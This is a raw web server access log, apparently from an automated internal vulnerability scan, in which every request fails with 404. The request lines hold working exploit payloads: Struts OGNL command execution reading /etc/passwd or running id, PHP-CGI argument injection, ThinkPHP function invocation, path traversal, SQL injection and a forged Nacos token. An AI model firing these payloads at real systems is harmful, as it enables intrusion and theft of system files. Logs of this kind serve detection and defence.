INFO:     9.135.100.135:60704 - "POST /?name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27cat%20/etc/passwd%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60708 - "POST /invoker/EJBInvokerServlet/ HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60728 - "PUT /_users/org.couchdb.user%3Apoc HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60742 - "POST /invoker/readonly HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60798 - "POST /integration/saveGangster.action HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60876 - "GET /index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60896 - "GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60918 - "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:32828 - "GET /?id=DqjacP%25{128*128} HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:32860 - "GET /solr/admin/cores?wt=json HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:32864 - "GET /query?db=db&q=SHOW%20DATABASES HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:32892 - "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33028 - "POST /jars/upload HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33056 - "GET /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33062 - "POST /_async/AsyncResponseService HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33070 - "GET /lua/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././find_prefs.lua.css HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33072 - "GET /?id=%25%7B%28%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D%29.%28%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D%29.%28%23bean%3D%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3D%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3D%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3D%23instancemanager.newInstance%28%22java.util.HashSet%22%29%29.%28%23bean.put%28%22excludedClasses%22%2C%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2C%23emptyset%29%29.%28%23arglist%3D%23instancemanager.newInstance%28%22java.util.ArrayList%22%29%29.%28%23arglist.add%28%22cat+%2Fetc%2Fpasswd%22%29%29.%28%23execute%3D%23instancemanager.newInstance%28%22freemarker.template.utility.Execute%22%29%29.%28%23execute.exec%28%23arglist%29%29%7D HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33090 - "GET /_async/favicon.ico HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33092 - "GET /lua/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././find_prefs.lua.css HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33264 - "GET /public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33276 - "POST /minio/bootstrap/v1/verify HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33292 - "GET /public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../windows/win.ini HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33296 - "GET /webui/ HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33306 - "POST /v6.58/Products/Authentication HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33312 - "GET /public/plugins/alertlist/../../../../../conf/defaults.ini HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33324 - "POST /services/messagebroker/streamingamf HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33460 - "GET /config HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33490 - "POST /component_server HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33494 - "POST /app/rest/users/id%3A1/tokens/336iEcNJgvbJlKTm2iqJXI3AZwb%3B.jsp?jsp_precompile=true HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33498 - "GET /storage/logs/laravel.log HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33514 - "GET /streampipes-backend/api/v2/auth/settings HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33542 - "GET /streampipes-backend/api/openapi.json HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33666 - "GET /tmp/temp.db%3F.1.1.1.1a-1.css HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33676 - "POST /webtools/control/main/ProgramExport HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33694 - "GET /api/data HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33698 - "GET /mnt/ram/var/log/httpd.log%3F.1.1.1.1a-1.css HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33728 - "POST /client/api?command=samlSso HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33860 - "GET /solr/admin/info/properties%3A/admin/info/key HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33882 - "POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33892 - "POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33900 - "POST /index.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33908 - "POST /drag/onlDragDatasetHead/getTotalData HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33926 - "GET /users HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33942 - "POST /test.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33952 - "GET /users%3B. HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33968 - "POST /test.hello?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34044 - "POST /api/v0/train HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34094 - "POST /dataSetParam/verification%3Bswagger-ui/ HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34118 - "GET /login?next=/ HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34204 - "POST / HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34248 - "POST / HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34270 - "GET / HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34276 - "GET /%40fs/C%3A/windows/win.ini?import&?inline=1.wasm?init HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34312 - "GET /%40fs/etc/passwd?import&?inline=1.wasm?init HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34336 - "GET /%40fs/../../../../../../../etc/passwd?import&?inline=1.wasm?init HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34366 - "GET /%40fs/%252e%252e/%252e%252e/%252e%252e/etc/passwd?import&?inline=1.wasm?init HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34380 - "GET /index.php?p=admin/actions/assets/generate-transform HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34426 - "POST /api/v1/validate/code HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34444 - "GET /portalapi/v1/roles/option%3B/v1/ping HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34556 - "GET /public/template.cgi?templatefile=$(id) HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34606 - "GET /locales/locale.json?locale=..%2F..%2Fconfig&namespace=app HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34620 - "POST /api/jmeter/download/files HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34726 - "GET /camunda/app/welcome/default/ HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34754 - "GET /?query=SHOW%20DATABASES HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34796 - "GET /query?db=db&q=SHOW%20DATABASES HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34804 - "POST /api/snapshots HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34902 - "POST /api/snapshots HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34918 - "GET /apisix/admin/migrate/export HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34996 - "GET /version HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35000 - "GET /druid/submitLogin HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35114 - "GET /install.php?profile=default HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35136 - "GET /core/install.php HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35134 - "GET /api/dev/metrics/relation HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35176 - "GET / HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35188 - "POST /index.php?r=site/user-login HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35202 - "GET /login HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35302 - "POST /hub/login?next HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35312 - "GET /./../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35326 - "POST /hub/login?next HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35364 - "GET /sse?transportType=stdio&command=echo&args=IT_RiskScan HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35368 - "GET /nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35396 - "GET /v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35474 - "GET /api/version HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35494 - "GET / HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35498 - "POST /login/userverify.cgi HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35518 - "GET / HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35556 - "GET /naming/v1/services?limit=10&offset=0 HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35662 - "GET /web/admin/setup HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35676 - "GET /login/ HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35688 - "GET /index.php?s=/index/index/name/$%7B@phpinfo()%7D HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35734 - "POST /?s=index/index/index HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35820 - "GET /?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35826 - "POST /index.php?s=captcha HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35858 - "GET /index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1 HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35896 - "GET /api/cluster/global HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35978 - "GET /setup HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35988 - "GET /favicon.ico HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35998 - "GET /api/v1/namespaces/default/workflows?query HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:36002 - "GET / HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:36054 - "GET /wp-admin/install.php?step=1 HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:39130 - "PRI %2A HTTP/2.0" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     9.135.100.135:41064 - "GET /icons/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
INFO:     9.135.100.135:55316 - "GET / HTTP/1.0" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     9.135.100.135:50732 - "OPTIONS / HTTP/1.0" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     9.135.100.135:40102 - "GET / HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:59670 - "GET http%3A//9.139.82.162/itscan.html HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:59702 - "GET http%3A//10.99.229.178/itscan.html HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:59720 - "GET http%3A//9.218.232.52/itscan.html HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:59884 - "GET /login HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60168 - "PRI %2A HTTP/2.0" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     9.135.100.135:60572 - "GET / HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60668 - "GET /favicon.ico HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60722 - "GET /cgi-bin/gateway/agentinfo HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60722 - "POST /run HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
INFO:     9.135.100.135:60722 - "GET /api/session/properties HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60722 - "GET /console/css/%252e%252e%252f/consolejndi.portal HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60832 - "POST /scripts/setup.php HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60844 - "POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60848 - "GET /index.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60888 - "GET /login.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60914 - "GET /index.action?redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60934 - "POST /user.action HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60996 - "POST /?q=node&destination=node HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:32772 - "GET /index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat%20/etc/passwd HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60952 - "GET /index.action?action:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:32868 - "GET /login.action?action:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:32874 - "PUT /fileserver/339XMQeMXuD02hVk8u4TtI7B8gq.txt HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:32910 - "GET /fileserver/339XMQeMXuD02hVk8u4TtI7B8gq.txt HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:32906 - "GET /index.action?action%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:32942 - "POST /invoker/JMXInvokerServlet/ HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:32948 - "POST /?name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27cat%20/etc/passwd%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:32968 - "GET /index.action?redirectAction:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:32980 - "POST /invoker/EJBInvokerServlet/ HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33004 - "POST /invoker/readonly HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33006 - "GET /login.action?redirectAction:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33040 - "GET /index.action?redirectAction%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33090 - "PUT /_users/org.couchdb.user%3Apoc HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33140 - "POST /integration/saveGangster.action HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33172 - "GET /index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33204 - "GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33246 - "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33342 - "GET /?id=ybnXRJ%25{128*128} HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33374 - "GET /solr/admin/cores?wt=json HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33424 - "GET /query?db=db&q=SHOW%20DATABASES HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33474 - "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33548 - "POST /jars/upload HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33576 - "GET /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33596 - "GET /?id=%25%7B%28%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D%29.%28%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D%29.%28%23bean%3D%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3D%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3D%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3D%23instancemanager.newInstance%28%22java.util.HashSet%22%29%29.%28%23bean.put%28%22excludedClasses%22%2C%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2C%23emptyset%29%29.%28%23arglist%3D%23instancemanager.newInstance%28%22java.util.ArrayList%22%29%29.%28%23arglist.add%28%22cat+%2Fetc%2Fpasswd%22%29%29.%28%23execute%3D%23instancemanager.newInstance%28%22freemarker.template.utility.Execute%22%29%29.%28%23execute.exec%28%23arglist%29%29%7D HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33650 - "GET /lua/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././find_prefs.lua.css HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33672 - "GET /lua/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././find_prefs.lua.css HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33768 - "POST /_async/AsyncResponseService HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33782 - "GET /public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33790 - "GET /_async/favicon.ico HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33814 - "GET /public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../windows/win.ini HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33816 - "POST /minio/bootstrap/v1/verify HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33836 - "GET /public/plugins/alertlist/../../../../../conf/defaults.ini HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33866 - "GET /webui/ HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33882 - "POST /services/messagebroker/streamingamf HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33962 - "POST /v6.58/Products/Authentication HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:33988 - "GET /config HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34012 - "POST /component_server HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34014 - "POST /app/rest/users/id%3A1/tokens/339XMWELJeMnhM1rQ8R0NFY4tGS%3B.jsp?jsp_precompile=true HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34070 - "GET /storage/logs/laravel.log HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34166 - "GET /streampipes-backend/api/v2/auth/settings HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34182 - "GET /streampipes-backend/api/openapi.json HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34204 - "GET /tmp/temp.db%3F.1.1.1.1a-1.css HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34208 - "POST /webtools/control/main/ProgramExport HTTP/1.1" 404 Not Found
